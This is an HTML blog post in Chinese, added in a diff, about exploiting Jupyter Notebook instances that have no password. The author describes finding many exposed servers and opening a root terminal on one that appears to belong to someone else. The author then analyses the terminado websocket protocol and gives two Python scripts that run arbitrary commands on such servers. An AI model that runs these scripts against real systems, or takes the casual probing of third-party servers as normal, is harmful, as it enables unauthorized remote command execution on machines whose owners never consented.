@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>一次从未授权开始的研究 | Ja9er&#39;s Studio</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://ja9er.github.io/favicon.ico?v=1642400876014">
+<link rel="stylesheet" href="https://ja9er.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="0x01 开始
+摸鱼看到文章
+
+Jupyter-Notebook是基于网页的用于交互计算的应用程序。其可被应用于全过程计算：开发、文档编写、运行代码和展示结果。——Jupyter Notebook官方介绍
+
+简而言之，Jupyter Not..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://ja9er.github.io">
+        <img src="https://ja9er.github.io/images/avatar.png?v=1642400876014" class="site-logo">
+        <h1 class="site-title">Ja9er&#39;s Studio</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      燃烧掉总比消失好
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://ja9er.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">一次从未授权开始的研究</h2>
+            <div class="post-date">2021-07-06</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="0x01-开始">0x01 开始</h1>
+<p>摸鱼看到文章</p>
+<blockquote>
+<p>Jupyter-Notebook是基于网页的用于交互计算的应用程序。其可被应用于全过程计算：开发、文档编写、运行代码和展示结果。——<a href="https://link.jianshu.com/?t=https%3A%2F%2Fjupyter-notebook.readthedocs.io%2Fen%2Fstable%2Fnotebook.html">Jupyter Notebook官方介绍</a></p>
+</blockquote>
+<p>简而言之，Jupyter Notebook是以网页的形式打开，可以在网页页面中<strong>直接</strong>编写代码和运行代码，代码的运行结果也会直接在代码块下显示。</p>
+<blockquote>
+<p>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
+</blockquote>
+<p>随便找找，好家伙这么多<br>
+<a href="https://imgtu.com/i/R7URb9"><img src="https://z3.ax1x.com/2021/07/06/R7URb9.md.png" alt="R7URb9.md.png" loading="lazy"></a></p>
+<h1 id="0x02-复现以及一点小研究">0x02 复现，以及一点小研究</h1>
+<p>找一个站点，所谓的未授权，大大的Terminal非常动人<br>
+<a href="https://imgtu.com/i/R7U7vD"><img src="https://z3.ax1x.com/2021/07/06/R7U7vD.md.png" alt="R7U7vD.md.png" loading="lazy"></a><br>
+查看权限，root。按理来说这次简单的复现到此为止，但是今天比较好奇，因为一直以来有个疑问，阿里云这类网页实现的console是怎么和服务器交互的。<br>
+<a href="https://imgtu.com/i/R7U2DJ"><img src="https://z3.ax1x.com/2021/07/06/R7U2DJ.md.png" alt="R7U2DJ.md.png" loading="lazy"></a><br>
+刚开始习惯性的开了Burp抓抓包，不过没办法加载出console界面，看来不是走的HTTP协议。打开wireshark跟踪流看看，可以看到返回包的标志是[&quot;stdout&quot;,&quot; &quot;],输入什么，响应什么，外加输入的结果一并返回<br>
+<a href="https://imgtu.com/i/R7UqDH"><img src="https://z3.ax1x.com/2021/07/06/R7UqDH.md.png" alt="R7UqDH.md.png" loading="lazy"></a><br>
+单输入一个l测试，注意这里并没有回车<br>
+<a href="https://imgtu.com/i/R7UbKe"><img src="https://z3.ax1x.com/2021/07/06/R7UbKe.md.png" alt="R7UbKe.md.png" loading="lazy"></a><br>
+知道是怎么获取结果的了，但是还是不清楚这里的输入是怎么发出去的。因为之前上burp没加载到网页，猜测和JS有关。于是翻了翻JS文件，果然找到一个terminado.js。一看代码就特别清楚了，妥妥的websocket标准用法。函数make_terminal的两个参数，element和ws_url。element用于生成节点，ws_url使用时传入的实参是由另一个config.js中配置的websocket 的url</p>
+<pre><code class="language-python">define ('terminal/js/terminado',[&quot;xterm&quot;, &quot;xtermjs-fit&quot;], function(Terminal, fit) {
+    &quot;use strict&quot;;
+    function make_terminal(element, ws_url) {
+        
+        var ws = new WebSocket(ws_url);
+        Terminal.applyAddon(fit);
+        var term = new Terminal();
+        ws.onopen = function(event) {
+            term.on('data', function(data) {
+                ws.send(JSON.stringify(['stdin', data]));
+            });
+            
+            term.on('title', function(title) {
+                document.title = title;
+            });
+            
+            term.open(element);
+            term.fit();
+            // send the terminal size to the server.
+            ws.send(JSON.stringify([&quot;set_size&quot;, term.rows, term.cols,
+                                        window.innerHeight, window.innerWidth]));
+
+            ws.onmessage = function(event) {
+                var json_msg = JSON.parse(event.data);
+                switch(json_msg[0]) {
+                    case &quot;stdout&quot;:
+                        term.write(json_msg[1]);
+                        break;
+                    case &quot;disconnect&quot;:
+                        term.write(&quot;\r\n\r\n[CLOSED]\r\n&quot;);
+                        break;
+                }
+            };
+        };
+        return {socket: ws, term: term};
+    }
+
+    return {make_terminal: make_terminal};
+});
+
+
+</code></pre>
+<p>这其中 <code>ws.send(JSON.stringify(['stdin', data]));</code>传递输入的消息,<code>ws.onmessage</code>获取websocket端返回的消息。我们可以打个断点看看。</p>
+<p>首先按下回车<br>
+<a href="https://imgtu.com/i/R7UfER"><img src="https://z3.ax1x.com/2021/07/06/R7UfER.png" alt="R7UfER.png" loading="lazy"></a></p>
+<p>控制台打出来，看看ws 到底send了个啥玩意儿。<br>
+<a href="https://imgtu.com/i/R7UhU1"><img src="https://z3.ax1x.com/2021/07/06/R7UhU1.png" alt="R7UhU1.png" loading="lazy"></a></p>
+<p>&quot;\\r&quot;,回车的转义符号。看起来&quot;[&quot;stdin&quot;,&quot;\r&quot;]&quot;就是send到server端的奥秘。此时，一个大胆且完整的想法已经回荡在我的脑海里了，只差最后一个拼图。写作也讲究人物地点时间三要素，显然，send，你也要有个send出去的地址，这就是websocket的server端。</p>
+<p>在之前的js中有这么一段<code>var ws = new WebSocket(ws_url);</code>，很显然这就是我们要追寻的答案</p>
+<pre><code class="language-python">ws://ip:port/terminals/websocket/5 #server端地址
+</code></pre>
+<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/R7U44x"><img src="https://z3.ax1x.com/2021/07/06/R7U44x.png" alt="R7U44x.png" loading="lazy"></a></figure>
+<h1 id="0x03-python实现命令执行">0x03 Python实现命令执行</h1>
+<p>最后，用python实现简单的控制,这段代码还是有bug的。后面再改吧，同步问题实在太坑了</p>
+<pre><code class="language-python">from websocket import create_connection
+cmd=&quot;whoami&quot;
+target = 'ws://IP:PORT/terminals/websocket/4'
+ws = create_connection(target)
+ws.send(&quot;[\&quot;stdin\&quot;,\&quot;{} \\r \&quot;]&quot;.format(cmd))
+lists=[]
+for i in range(0,4):
+    res = ws.recv()
+    lists.append(res)
+key=-1
+for index,j in enumerate(lists):
+    if cmd in j:
+        key=index
+        break
+print lists[key+1]
+</code></pre>
+<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/R7UIC6"><img src="https://z3.ax1x.com/2021/07/06/R7UIC6.png" alt="R7UIC6.png" loading="lazy"></a></figure>
+<hr>
+<p>修改后的代码，基本可控了</p>
+<pre><code class="language-python">from websocket import create_connection
+result=&quot;&quot;
+cmd=&quot;whoami&quot;
+target = 'ws://IP:PORT/terminals/websocket/4'
+ws = create_connection(target)
+
+ws.send(&quot;[\&quot;stdin\&quot;,\&quot;{} \\r \&quot;]&quot;.format(cmd))
+
+def get_list(NUM):
+    lists=[]
+    for i in range(0, NUM):
+        res = ws.recv()
+        lists.append(res)
+    return lists
+
+def find_result(lists):
+    key = -1
+    for index, j in enumerate(lists):
+        if cmd in j:
+            key = index
+            break
+    return key
+
+while True:
+    try:
+        list = get_list(4)
+        key = find_result(list)
+        if key &gt;= 0:
+            if key + 1 &gt; 3:
+                list = get_list(1)
+                result = list[0]
+                break
+            else:
+                result = list[key + 1]
+                break
+    except Exception as e:
+        break
+
+
+print result
+
+
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://ja9er.github.io/cve-2021-3378-fortilogger-ren-yi-yong-hu-chuang-jian-poc/">
+                  <h3 class="post-title">
+                    (CVE-2021-3378) FortiLogger 任意用户创建 POC
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
